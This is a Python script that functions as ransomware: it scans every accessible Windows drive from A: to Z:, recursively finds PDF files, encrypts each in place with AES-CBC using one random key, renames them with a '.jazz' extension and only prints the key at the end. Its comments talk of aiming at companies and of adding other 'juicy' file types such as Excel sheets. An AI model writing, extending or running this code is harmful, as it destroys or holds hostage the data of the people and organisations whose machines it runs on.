import os
import glob
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# Function to encrypt a file and alter its file name to .jazz
def encrypt_file(file_path, key):
    try:
        # Reading original file
        with open(file_path, 'rb') as file:
            data = file.read()

        # Create an AES cipher object with the key and a random initialization vector (IV) We can change this cipher if it is not strong enough 
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv  # Get the Initial Vector used by the cipher

        # Pad the data to be a multiple of 16 bytes
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))

        # Write the encrypted data and Initalization Vector back to the file
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(iv + encrypted_data)

        # Change the file extension to .jazz
        new_file_path = file_path + '.jazz'
        os.rename(file_path, new_file_path)

        print(f"Encrypted {file_path} and renamed to {new_file_path}")

    except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
        # Handle errors allowing it to continue to the next file
        print(f"Skipping {file_path}: {e}")

# Function to get all .pdf files in a specific directory We can alter this to add other file types currenlty just PDFs may include excel sheets and whatever other file type seems juicy
def get_pdf_files(directory):
    return glob.glob(os.path.join(directory, '**', '*.pdf'), recursive=True)

# Some companies may use drives other than C: for security or storage purposes this checks all possible letters A-Z so all files of the deemed file type are encrypted.
# Function to check if a drive exists and is accessible
def drive_exists(drive_letter):
    # Check if the drive exists
    drive_path = f"{drive_letter}:/"
    try:
        if os.path.exists(drive_path) and os.access(drive_path, os.R_OK | os.W_OK):
            return True
        else:
            print(f"Drive {drive_letter}:/ does not exist or cannot be accessed.")
            return False
    except OSError as e:
        print(f"Error accessing drive {drive_letter}:/ : {e}")
        return False

# Generate a key Must be used for decryption 
key = get_random_bytes(16)  # 16 bytes = 128 bits key

# Iterate over all possible drives from A:/ to Z:/
for drive_letter in range(ord('A'), ord('Z') + 1):
    drive = chr(drive_letter)
    try:
        if drive_exists(drive):
            print(f"Searching for PDFs in {drive}")
            pdf_files = get_pdf_files(drive + ":/")
            
            # Encrypt each file
            for pdf in pdf_files:
                encrypt_file(pdf, key)
        else:
            print(f"Skipping drive {drive} as it does not exist or is not accessible.")
    except Exception as e:
        print(f"Error while processing drive {drive}: {e}")

#  Save your encryption key otherwise data is lost. 
print(f"Your encryption key: {key.hex()}")
